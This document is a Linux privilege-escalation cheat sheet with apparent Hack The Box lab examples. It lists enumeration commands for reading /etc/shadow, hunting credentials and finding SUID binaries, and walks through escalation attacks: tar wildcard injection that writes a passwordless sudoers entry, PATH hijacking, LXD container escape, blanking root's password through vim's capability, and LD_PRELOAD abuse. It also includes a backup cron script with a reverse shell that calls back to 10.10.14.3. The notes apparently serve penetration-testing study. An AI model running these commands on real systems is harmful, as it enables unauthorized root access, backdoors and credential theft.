# Linux Privilege Escalation

- [ ] Mercury
- [x] Venus

## User & Process Enumeration

### User
cat /etc/shells # Available login shells
whoami # Get current user context 
id # what groups does the user belong to
sudo -l	# Can the user run anything as another user?
history	# Check the current user's bash history
ls -all ~/.ssh 	# Check for SSH keys for current user
echo $PATH # Check the current user's PATH variable contents
env # check environmental vars for the user, may find a password
lastlog # check user's last login time

### Other Users
ls -alh /home	# View user home directories. Check .bash_history & .ssh/ for keys
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null # find history files
ps au # See logged in users
w # see logged in users
finger # see logged in users
cat /etc/passwd | cut -f1 -d: # get all users from /etc/passwd

### SEDUID & SETGID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SUID bit set. The file will execute with the privileges of the file group.
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SETGID bit set. The file will execute with the privilege of the file owner.

### Passwords & Hashes
cat /etc/passwd # file is readable by all users, sometimes a hash will be in here. If we have the shadow file, too, then we can crack the hashes
cat /etc/shadow # if readable, then hashes for all users will be available to crack
cat /etc/group # view groups
getent group sudo # get the members of ANY group, e.g. sudo
grep 'DB_USER\|DB_PASSWORD' wp-config.php # Look for credentials
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null # Look for credentials 

### Processes
ps au
ps aux | grep root	# See processes running as root
ps aux | grep $user # See processes running as $user
ls -la /etc/cron.daily # Check for daily Cron jobs
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null # Find world-writeable directories. Interesting dirs could be used by cron jobs that can be exploited
./pspy64 -pf -i 1000	# View running processes with pspy. -pf print cmds and -i 1000 refresh every 1000/ms (every second)

### Services, Packages, & Binaries
sudo -V # Check sudo version to see if vulnerable to exploit
ls -l /bin /usr/bin/ /usr/sbin/ # View binaries
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list # Create a list of installed packages
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done # Search GTFObins for installed package list created above
strace ping -c1 10.129.112.20 # track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system

### Writable dirs & files
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	# Find world-writeable directories. Interesting dirs could be used by cron jobs that can be exploited
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	# Find world-writeable files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	# Search for config files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null # Get all readable config files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep username # All hidden files for $username
find / -type d -name ".*" -ls 2>/dev/null # All hidden directories
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" # Search for scripts

### Interesting dirs
ls -l /tmp /var/tmp /dev/shm # View temporary files
/tmp # Data stored for up to 10 days or upon device restart
/var/tmp # Data stored for up to 30 days

## System & Environment Enumeration

### OS Information
hostname
cat /etc/os-release # Check the OS version
cat /etc/lsb-release	# Check the OS version
uname -a	# Check the Kernel version
cat /proc/version # Check the Kernal version
lscpu # Check the CPU type/version
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" #  used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.


### Network Information
ip a # check subnets and NICs
ifconfig # check subnets and NICs
route # routing table
netstat -rn # routing table
arp -a # Check what other hosts the system has been communicating with
cat /etc/hosts # local DNS entries


### Mounted File Systems & Additional drives / peripherals
df -h # View mounted file systems. Root required to mount/unmount drives.
lsblk	# Check for unmounted file systems/drives. If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.
cat /etc/fstab # search for 'password' 'username', 'credential' by grepping. Used for mounted drives
cat /etc/fstab | grep -v password # example
lpstat # Check for any attached printers for potential interesting info
cat /etc/fstab | grep -v "#" | column -t # View unmounted file systems

# Linux Privilege Escalation Techniques

## Environmental-based Privilege Escalation

### Path Abuse

```text
Adding . to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as ls with a malicious script such as a reverse shell. If we add . to the path by issuing the command PATH=.:$PATH and then export PATH, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing ls will call the malicious script named ls in the current working directory instead of the binary located at /bin/ls).
``` 

env | grep PATH  # Check the PATH var contents
echo $PATH # Check the PATH var contents

```bash
haunter@kali:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

haunter@kali:~$ PATH=.:${PATH}
haunter@kali:~$ export PATH
haunter@kali:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

In this example, we modify the path to run a simple echo command when the command ls is typed.

haunter@kali:~$ touch ls
haunter@kali:~$ echo 'echo "PATH ABUSE!!"' > ls
haunter@kali:~$ chmod +x ls

haunter@kali:~$ ls

PATH ABUSE!!
```

### Wildcard Abuse

```text
An example of how wildcards can be abused for privilege escalation is the tar command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:

htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.

The --checkpoint-action option permits an EXEC action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the /home/htb-student directory's contents and create a compressed archive within /home/htb-student. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify. 

htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1

We can check and see that the necessary files were created.

htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL

Character	Significance
*	An asterisk that can match any number of characters in a file name.
?	Matches a single character.
[ ]	Brackets enclose characters and can match any single one at the defined position.
~	A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
-	A hyphen within brackets will denote a range of characters.
```

### Restricted Shell Escape

https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/escaping-from-limited-bash

Common Ristricted Shells
* rbash - most restrictive
* rksh - moderately restrictive
* rzsh - most flexible

#### Command Injection

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.

haunteractual@htb[/htb]$ ls -l `pwd` 

#### Command Substition

For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.

#### Command Chaining

We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.


#### Environmental Variables

For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.

#### Shell Functions

For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.


## Permissions-based Privilege Escalation

### Special Permissions

Check GTFObins for any SUID OR SGID bins.

### Sudo Abuse

Check user's sudo commands with:

sudo -l

If any commands are listed, check the man pages for the command. Can the command execute files or other commands? Create a revshell file and run or launch a shell.

### Prilileged Groups

* LXC
* LXD
* ADM

LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.

  Privileged Groups
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
Unzip the Alpine image.

  Privileged Groups
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.

  Privileged Groups
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
Import the local image.

  Privileged Groups
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

  Privileged Groups
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
Mount the host file system.

  Privileged Groups
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type cd /mnt/root/root. From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

  Privileged Groups
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command docker run -v /root:/mnt -it ubuntu. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.

Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

ADM
Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

  Privileged Groups
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

find / -group adm -type f 2>/dev/null -print0 | xargs -0 grep flag

### Special File Capabilities

```text
Capability	Description
cap_sys_admin	Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.
cap_sys_chroot	Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.
cap_sys_ptrace	Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.
cap_sys_nice	Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.
cap_sys_time	Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.
cap_sys_resource	Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.
cap_sys_module	Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.
cap_net_bind_service	Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.
```

```text
Values	Description
=	This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.
+ep	This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.
+ei	This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.
+p	This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.
```

```text
Several Linux capabilities can be used to escalate a user's privileges to root, including:

Capability	Description
cap_setuid	Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.
cap_setgid	Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.
cap_sys_admin	This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.
cap_dac_override	Allows bypassing of file read, write, and execute permission checks.
```
getcap -r / 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

If we gained access to the system with a low-privilege account, then discovered the cap_dac_override capability:

Exploiting Capabilities
  Capabilities
haunteractual@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo. However, because the binary has the cap_dac_override capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the cap_dac_override capability and perform tasks that require this capability.

Let us take a look at the /etc/passwd file where the user root is specified:

  Capabilities
haunteractual@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:

  Capabilities
haunteractual@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
We also can make these changes in a non-interactive mode:

echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

### Cron Job Abuse

Enumerate writable directories, then check the folder for interesting files being created on a set schedule to indicate a cronjob action (such as a scheduled backup). 

Use pspy to list processes and look for processes run by root UID=0 that match the directory.

Edit the script being run to include a revshell:

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
# revshell payload
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

### Container Abuse

We must be in either the lxc or lxd group. We can find this out with the following command:

container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

gcc kernel_expoit.c -o kernel_expoit #	Compile an exploit written in C
screen -v	# Check the installed version of Screen
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	# Priv esc with tcpdump
ldd /bin/ls	# View the shared objects required by a binary
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	# Escalate privileges using LD_PRELOAD
readelf -d payroll | grep PATH	# Check the RUNPATH of a binary
gcc src.c -fPIC -shared -o /development/libshared.so	# Compiled a shared libary
lxd init	# Start the LXD initialization process
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	# Import a local image
lxc init alpine r00t -c security.privileged=true	 # Start a privileged LXD container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true	# Mount the host file system in a container
lxc start r00t	# Start the container
showmount -e 10.129.2.12	# Show the NFS export list
sudo mount -t nfs 10.129.2.12:/tmp /mnt	# Mount an NFS share locally
tmux -S /shareds new -s debugsess	# Created a shared tmux session socket
./lynis audit system	# Perform a system audit with Lynis
